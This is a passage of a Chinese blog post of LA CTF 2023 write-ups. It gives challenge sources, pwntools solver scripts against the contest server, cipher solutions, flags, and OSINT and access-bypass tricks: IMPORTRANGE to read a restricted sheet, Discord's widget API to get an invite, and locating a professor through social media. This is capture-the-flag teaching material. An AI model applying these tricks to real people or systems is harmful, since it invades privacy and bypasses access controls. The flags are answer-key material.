class="hljs-string">&quot;Type your guess here: &quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(guess) == target:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                <span class="hljs-built_in">print</span>(f.readline())<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nope&quot;</span>)<br>        exit()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bye&quot;</span>)<br>        exit()<br><br></code></pre></td></tr></table></figure>
+<h4 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h4><p><code>print(target%modulus)</code>令modulus大于target就可以泄露target<br><img src="/mdimg/lactf/15.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="rolling-in-the-mud"><a href="#rolling-in-the-mud" class="headerlink" title="rolling in the mud"></a><strong>rolling in the mud</strong></h3><h4 id="题目说明-10"><a href="#题目说明-10" class="headerlink" title="题目说明"></a>题目说明</h4><p>uugh, these pigs in my pen are making a complete mess! They’re <em>rolling</em> all over the place!<br>Anyway, can you decode this cipher they gave me, almost throwing it at me while rolling around?<br>Answer in lowercase with symbols. In the image, { and } are characters that should appear in your flag, and replace spaces with _.</p>
+<h4 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/lactf/16.png" srcset="/img/loading.gif" lazyload><br>显然猪圈<br><a target="_blank" rel="noopener" href="http://moersima.00cha.net/zhuquan.asp">http://moersima.00cha.net/zhuquan.asp</a><br><code>&#123;eombmcvcalebupauntcnjppmjfnicnappmjfnippmjfni&#125;dugip</code><br>逆序一下然后<br><a target="_blank" rel="noopener" href="http://www.quipqiup.com/">http://www.quipqiup.com/</a>爆破一下<br><code>lactf&#123;rolling_and_rolling_and_rolling_until_the_pigs_go_home&#125;</code></p>
+<h3 id="greek-cipher"><a href="#greek-cipher" class="headerlink" title="greek cipher"></a>greek cipher</h3><h4 id="题目说明-11"><a href="#题目说明-11" class="headerlink" title="题目说明"></a>题目说明</h4><p>You think you’ve seen all of the “classic” ciphers? Instead of your standard cipher, I’ve created my own cipher: the monoalphagreek cipher!<br>Answer with just the flag in lowercase with symbols left in.</p>
+<h4 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ζπι ιηγ δςρθι ψγρθπζ ςζ ηςθιπρω θνθψγμιγκ πδ νθςζε γζμρωψιςπζ? τγ ζγςιηγρ. κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ψρπξσξοω δονγζι ςζ εργγα? τγ ζγςιηγρ. ς οςαγ ηπλ εργγα μησρσμιγρ οππα ιηπνεη, γυγζ ςδ ς μσζ<span class="hljs-string">&#x27;ι ργσκ ιηγτ. οσμιδ&#123;ς_ενγθθ_νθςζε_τσζω_εργγα_μησρσμιγρθ_κςκζ&#x27;</span>ι<span class="hljs-literal">_</span>θιπψ<span class="hljs-literal">_</span>ωπν.<span class="hljs-literal">_</span>λγοο<span class="hljs-literal">_</span>ψοσωγκ<span class="hljs-literal">_</span>ς<span class="hljs-literal">_</span>τνθι<span class="hljs-literal">_</span>θσω.μπζερσιθ!&#125;<br></code></pre></td></tr></table></figure>
+<p>参考了国外师傅的wp，只能说6666<br><code>**print(&#39;&#39;.join(sorted(set(input()))))**</code><br>这段代码实现了一个字符串的去重排序功能。它会接收用户的输入作为字符串，将其转换为一个集合，从而删除重复的字符。然后，它将集合排序，并将其转换回字符串。最后，代码使用 “print” 函数打印出结果。<br>然后借助一个工具网站<a target="_blank" rel="noopener" href="https://tio.run/#">https://tio.run/#</a><br><img src="/mdimg/lactf/17.png" srcset="/img/loading.gif" lazyload><br>然后用Cyberchef的Substitute<br><img src="/mdimg/lactf/18.png" srcset="/img/loading.gif" lazyload><br>最后quipqiup<br><img src="/mdimg/lactf/19.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="guess-the-bit"><a href="#guess-the-bit" class="headerlink" title="guess-the-bit!"></a>guess-the-bit!</h3><h4 id="题目说明-12"><a href="#题目说明-12" class="headerlink" title="题目说明"></a>题目说明</h4><p>I’m trying out for this new game show, but it doesn’t seem that hard since there are only two choices? Regardless, I heard someone name Pollard could help me out with it?</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><br>n = <span class="hljs-number">43799663339063312211273714468571591746940179019655418145595314556164983756585900662541462573429625012257141409310387298658375836921310691578072985664621716240663221443527506757539532339372290041884633435626429390371850645743643273836882575180662344402698999778971350763364891217650903860191529913028504029597794358613653479290767790778510701279503128925407744958108039428298936189375732992781717888915493080336718221632665984609704015735266455668556495869437668868103607888809570667555794011994982530936046877122373871458757189204379101886886020141036227219889443327932080080504040633414853351599120601270071913534530651</span><br><br>a = <span class="hljs-number">6</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n = &quot;</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a = &quot;</span>, <span class="hljs-number">6</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">150</span>):<br>    bit = random.randrange(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)<br>    c = random.randrange(<span class="hljs-number">0</span>, n)<br>    c = c**<span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span> bit == <span class="hljs-number">1</span>:<br>        c *= a<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c = &quot;</span>, c)<br>    guess = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;What is your guess? &quot;</span>))<br>    <span class="hljs-keyword">if</span> guess != bit:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Better luck next time!&quot;</span>)<br>        exit()<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Congrats! Here&#x27;s your flag: &quot;</span>)<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).readline().strip()<br><span class="hljs-built_in">print</span>(flag)<br>exit(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>
+<h4 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h4><p>仔细观察加密源码逻辑，进行了 150 次循环，每次循环都生成一个随机数字 c，该数字要么是原始数字的平方，要么是原始数字的平方与 6的积。所以需要猜测该数字是否是平方或者6的倍数。<img src="/mdimg/lactf/20.png" srcset="/img/loading.gif" lazyload><br>如上图所示，如果两个条件都成立，向服务器返回”1” ，否则返回 “0” 。可以一个个去算，但是捏，150次，懂自懂，所以借助pwntools来写个脚本来交互。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.primetest <span class="hljs-keyword">import</span> is_square <br><br>p = remote(<span class="hljs-string">&#x27;lac.tf&#x27;</span>, <span class="hljs-number">31190</span>)<br>p.recvline()<br>p.recvline()<br><br>C = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> C != <span class="hljs-number">150</span>:<br>    c = <span class="hljs-built_in">int</span>((p.recvline().decode()).split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">if</span> c%<span class="hljs-number">6</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> is_square(c//<span class="hljs-number">6</span>):<br>        p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p.sendline(<span class="hljs-string">b&quot;0&quot;</span>)<br>    C += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(C,end=<span class="hljs-string">&quot;\r&quot;</span>)<br><span class="hljs-built_in">print</span>(p.recv(<span class="hljs-number">1024</span>))<br><span class="hljs-built_in">print</span>(p.recv(<span class="hljs-number">1024</span>))<br><br><span class="hljs-comment"># lactf&#123;sm4ll_pla1nt3xt_sp4ac3s_ar3n&#x27;t_al4ways_e4sy&#125;</span><br></code></pre></td></tr></table></figure>
+<h3 id="chinese-lazy-theorem-2"><a href="#chinese-lazy-theorem-2" class="headerlink" title="chinese-lazy-theorem-2"></a>chinese-lazy-theorem-2</h3><h4 id="题目说明-13"><a href="#题目说明-13" class="headerlink" title="题目说明"></a>题目说明</h4><p>Ok I’m a little less lazy now but you’re still not getting much from me.<br><code>nc lac.tf 31111</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python3</span><br><br><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> Crypto.Random.random <span class="hljs-keyword">import</span> randint<br><br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q*<span class="hljs-number">2</span>*<span class="hljs-number">3</span>*<span class="hljs-number">5</span><br><br><br>target = randint(<span class="hljs-number">1</span>, n)<br><br><br>oracle_uses = <span class="hljs-number">0</span><br><br><br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(q)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;This time I&#x27;ll answer 2 modulus questions and give you 30 guesses.&quot;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;What do you want?&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1: Ask for a modulus&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2: Guess my number&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3: Exit&quot;</span>)<br>    response = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br><br><br>    <span class="hljs-keyword">if</span> response == <span class="hljs-string">&quot;1&quot;</span>:<br>        <span class="hljs-keyword">if</span> oracle_uses == <span class="hljs-number">2</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;too lazy&quot;</span>)<br>            <span class="hljs-built_in">print</span>()<br>        <span class="hljs-keyword">else</span>:<br>            modulus = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Type your modulus here: &quot;</span>)<br>            modulus = <span class="hljs-built_in">int</span>(modulus)<br>            <span class="hljs-keyword">if</span> modulus &lt;= <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;something positive pls&quot;</span>)<br>                <span class="hljs-built_in">print</span>()<br>            <span class="hljs-keyword">elif</span> modulus &gt; <span class="hljs-built_in">max</span>(p, q):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;something smaller pls&quot;</span>)<br>                <span class="hljs-built_in">print</span>()<br>            <span class="hljs-keyword">else</span>:<br>                oracle_uses += <span class="hljs-number">1</span><br>                <span class="hljs-built_in">print</span>(target%modulus)<br>                <span class="hljs-built_in">print</span>()<br>    <span class="hljs-keyword">elif</span> response == <span class="hljs-string">&quot;2&quot;</span>:<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>            guess = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Type your guess here: &quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(guess) == target:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                    <span class="hljs-built_in">print</span>(f.readline())<br>                    exit()<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nope&quot;</span>)<br>        exit()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bye&quot;</span>)<br>        exit()<br></code></pre></td></tr></table></figure>
+<h4 id="解题步骤-1"><a href="#解题步骤-1" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.modular <span class="hljs-keyword">import</span> crt<br><br><span class="hljs-keyword">with</span> remote(<span class="hljs-string">&quot;lac.tf&quot;</span>, <span class="hljs-number">31111</span>) <span class="hljs-keyword">as</span> r:<br>	p = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>	q = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>	r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>	r.readuntil(<span class="hljs-string">b&quot;Type your modulus here: &quot;</span>)<br>	r.sendline(<span class="hljs-built_in">str</span>(p).encode())<br>	x = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>	r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>	r.readuntil(<span class="hljs-string">b&quot;Type your modulus here: &quot;</span>)<br>	r.sendline(<span class="hljs-built_in">str</span>(q).encode())<br>	y = <span class="hljs-built_in">int</span>(r.readline(<span class="hljs-literal">False</span>))<br>	a, b = crt([p,q],[x,y])<br>	r.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>		r.readuntil(<span class="hljs-string">b&quot;Type your guess here: &quot;</span>)<br>		r.sendline(<span class="hljs-built_in">str</span>(a+i*b).encode())<br>		<span class="hljs-built_in">print</span>(r.readline())<br></code></pre></td></tr></table></figure>
+<p><img src="/mdimg/lactf/21.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="CATS"><a href="#CATS" class="headerlink" title="CATS!"></a>CATS!</h3><h4 id="题目说明-14"><a href="#题目说明-14" class="headerlink" title="题目说明"></a>题目说明</h4><p>CATS OMG I CAN’T BELIEVE HOW MANY CATS ARE IN THIS IMAGE I NEED TO VISIT CAN YOU FIGURE OUT THE NAME OF THIS CAT HEAVEN?<br>Answer is the domain of the website for this location. For example, if the answer was ucla, the flag would be lactf{ucla.edu}.</p>
+<h4 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h4><p>g0at：一眼丁真的社工题<br><img src="/mdimg/lactf/22.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/lactf/23.png" srcset="/img/loading.gif" lazyload><br><a target="_blank" rel="noopener" href="https://www.mentalfloss.com/article/576608/lanai-cat-sanctuary-hawaii-shelters-600-cats">https://www.mentalfloss.com/article/576608/lanai-cat-sanctuary-hawaii-shelters-600-cats</a>文章里面有他们的官网 如下图所示<br><img src="/mdimg/lactf/24.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="hike-to-where"><a href="#hike-to-where" class="headerlink" title="hike to where?"></a>hike to where?</h3><h4 id="题目说明-15"><a href="#题目说明-15" class="headerlink" title="题目说明"></a>题目说明</h4><p>Where was this photo taken? I think it used to be in the original photo, but someone cropped it out!<br>The flag is <code>lactf&#123;location&#125;</code>, where location is the name of the POI that this person hiked up to, all lowercase and replacing spaces with underscrolls. Use the google maps name of the POI: for example, if the solution is the UCLA Bruin Bear statue, <a target="_blank" rel="noopener" href="https://www.google.com/maps/place/Bruin+Statue,+Los+Angeles,+CA+90095/@34.0709817,-118.4451726,21z/data=!4m6!3m5!1s0x80c2bc88d12933e3:0xa3b319ea03ca4057!8m2!3d34.0709621!4d-118.4449902!16s%2Fg%2F12hl7g0mm">this</a> is the google maps location, and the flag would be <code>lactf&#123;bruin_statue&#125;</code>.<br>Please note: contacting anyone or any organization beyond official LA CTF support channels regarding this challenge is against the rules. Please be respectful of those who are involved in this challenge.<br><img src="/mdimg/lactf/25.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h4><p>从他的衣服上面的字可以知道他是ucla的计算机学院的老师<br>尝试在ucla的官网找这个老师，但是没找到<br><img src="/mdimg/lactf/26.png" srcset="/img/loading.gif" lazyload><br>em…….识别出来的这个是生物老师<br>题目是远足，那就google一下<br><img src="/mdimg/lactf/27.png" srcset="/img/loading.gif" lazyload><br>在Instagram里面找到这个人<a target="_blank" rel="noopener" href="https://www.instagram.com/peaksandprofessors.ucla/">https://www.instagram.com/peaksandprofessors.ucla/</a><br><img src="/mdimg/lactf/28.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/lactf/29.png" srcset="/img/loading.gif" lazyload><br><code>lactf&#123;skull_rock&#125;</code></p>
+<h3 id="hidden-in-plain-sheets"><a href="#hidden-in-plain-sheets" class="headerlink" title="hidden in plain sheets"></a>hidden in plain sheets</h3><h4 id="题目说明-16"><a href="#题目说明-16" class="headerlink" title="题目说明"></a>题目说明</h4><p>I found this google sheets link on the internet. I’m sure it’s hiding something, but I can’t find anything? Can you find the flag?<br>Choose any link (they’re all the same):  <a target="_blank" rel="noopener" href="https://docs.google.com/spreadsheets/d/1OYx3lCccLKYgOvzxkRZ5-vAwCn3mOvGUvB4AdnSbcZ4/edit">Link 1</a> <a target="_blank" rel="noopener" href="https://docs.google.com/spreadsheets/d/17A1f0z8rmR7356fcHmHTHt3Y0JMgcHlGoflADtNXeOU/edit">Link 2</a> <a target="_blank" rel="noopener" href="https://docs.google.com/spreadsheets/d/1ULdm_KCOYCWuf6gqpg6tm0t-wnWySX_Bf3yUYOfZ2tw/edit">Link 3</a></p>
+<h4 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h4><p>flag在另一个Sheet但我们没有查看权限<img src="/mdimg/lactf/30.png" srcset="/img/loading.gif" lazyload><br>经过查资料发现Google表格的<code>IMPORTRANGE</code>函数可以做到倒入内容这一点。<br><img src="/mdimg/lactf/31.png" srcset="/img/loading.gif" lazyload><br>所以直接get flag<br><img src="/mdimg/lactf/32.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="ECB"><a href="#ECB" class="headerlink" title="ECB"></a>ECB</h3><h4 id="题目说明-17"><a href="#题目说明-17" class="headerlink" title="题目说明"></a>题目说明</h4><p>I was trying to send a flag to my friend over UDP, one character at a time, but it got corrupted! I think someone else was messing around with me and sent extra bytes, though it seems like they actually abided by RFC 3514 for once. Can you get the flag?</p>
+<h4 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h4><p>UDP流量分析，采用了RFC 3514 <a target="_blank" rel="noopener" href="https://www.ietf.org/rfc/rfc3514.txt">https://www.ietf.org/rfc/rfc3514.txt</a><br><img src="/mdimg/lactf/33.png" srcset="/img/loading.gif" lazyload><br>:::tips<br>Flags是flag Segment的缩写，是标志字段。<br>它其实是IP报文头中的一个字段，因为TCP、UDP协议，应用层协议大部分都是封装在IP包中的，所以分析这些协议时，就会经常看到这个字段。<br>标识字段有3位。<br>Reserved bit：1位,是保留位，一般用不上；<br>Don’t fragment ：1位，用来表示数据包是否分片（Not set表示数据包没有分片）；<br>More fragment：1位，用来表示是否是最后一个片段（Not set表示是最后一个）。<br>:::<br>查看flags字段和Data段，data段有1字节数据。<br><img src="/mdimg/lactf/34.png" srcset="/img/loading.gif" lazyload><br>往下看，在N0.5，<br><img src="/mdimg/lactf/35.png" srcset="/img/loading.gif" lazyload><br>查看RFC 3514官方文档，如果IP<code> Reserved bit</code> 设置为 <code>1 (0x1)</code>，则它是一个恶意数据包。<br><img src="/mdimg/lactf/36.png" srcset="/img/loading.gif" lazyload><br>所以我们只需要将<code>Reserved bit</code>为0的包过滤出来，将data和Reserved bit设置为列，并将Reserved bit为0设置为过滤条件，也就是<code>ip.flags.rb == 0</code>，观察前几个发现就是lactf的hex值。<br><img src="/mdimg/lactf/37.png" srcset="/img/loading.gif" lazyload><br>导出过滤后的udp流<br>选择导出特定分组<br><img src="/mdimg/lactf/38.png" srcset="/img/loading.gif" lazyload><br>打开保存的udp流量包<br>追踪udp流<br><img src="/mdimg/lactf/39.png" srcset="/img/loading.gif" lazyload><br><code>lactf&#123;3V1L_817_3xf1l7R4710N_4_7H3_W1N_51D43c8000034d0c&#125;</code><br>tshark：<br><code>**tshark -r EBE.pcap -Y &quot;ip.flags.rb == 0x0&quot; -T fields -e data | xxd -r -p**</code><br><img src="/mdimg/lactf/40.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="discord-l34k"><a href="#discord-l34k" class="headerlink" title="discord l34k"></a>discord l34k</h3><h4 id="题目说明-18"><a href="#题目说明-18" class="headerlink" title="题目说明"></a>题目说明</h4><p>My friend sent me <a target="_blank" rel="noopener" href="https://discord.com/channels/1060030874722259057/1060030875187822724/1060031064669700186">this</a> message link that apparently links to a “flag”, but discord says “You don’t have access to this link”! They did mention something about them being able to embed a list of online users on their own website, and sent me this image. Can you figure out how to join the server?<br>Note: Discord phone verification is NOT required for this challenge.</p>
+<h4 id="解题思路-16"><a href="#解题思路-16" class="headerlink" title="解题思路"></a>解题思路</h4><p>题目给了一个discord链接<br><code>[https://discord.com/channels/1060030874722259057/1060030875187822724/1060031064669700186](https://discord.com/channels/1060030874722259057/1060030875187822724/1060031064669700186)</code><br><a target="_blank" rel="noopener" href="https://discord.com/blog/add-the-discord-widget-to-your-site/">https://discord.com/blog/add-the-discord-widget-to-your-site/</a> 在这篇文章中找到关键图片<br><img src="/mdimg/lactf/41.png" srcset="/img/loading.gif" lazyload><br>图片下面看到用于 JSON API的URL。在给定的 URL 中，第一个 ID ( 1060030874722259057) 指的是服务器，因此我们将其放在图像中示例 ID 的位置。这给了我们链接<br><code>[https://discordapp.com/api/servers/1060030874722259057/widget.json](https://discordapp.com/api/servers/1060030874722259057/widget.json)</code><br><img src="/mdimg/lactf/42.png" srcset="/img/loading.gif" lazyload><br>打开之后发现是个邀请链接，打开之后进入LA CTF-Chall Server 5服务器，就可以看到flag了<br><img src="/mdimg/lactf/43.png" srcset="/img/loading.gif" lazyload><br><img src="/mdimg/lactf/44.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/CTF/Write-Up/" class="category-chain-item">Write Up</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Write-Up/">#Write Up</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>LA CTF-wp by Hor1zon</div>
+      <div>http://example.com/2023/02/14/LA CTF/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Hor1zon</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年2月14日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              BY J_0K3R 
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/02/15/tplmap%E5%AE%89%E8%A3%85%E5%8F%8A%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/" title="tplmap安装小记">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">tplmap安装小记</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/02/13/%E6%B6%A9%E6%B6%A9/" title="社工">
+                        <span class="hidden-mobile">社工</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       J_0k3r <i class="iconfont icon-love"></i> Hor1zon 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
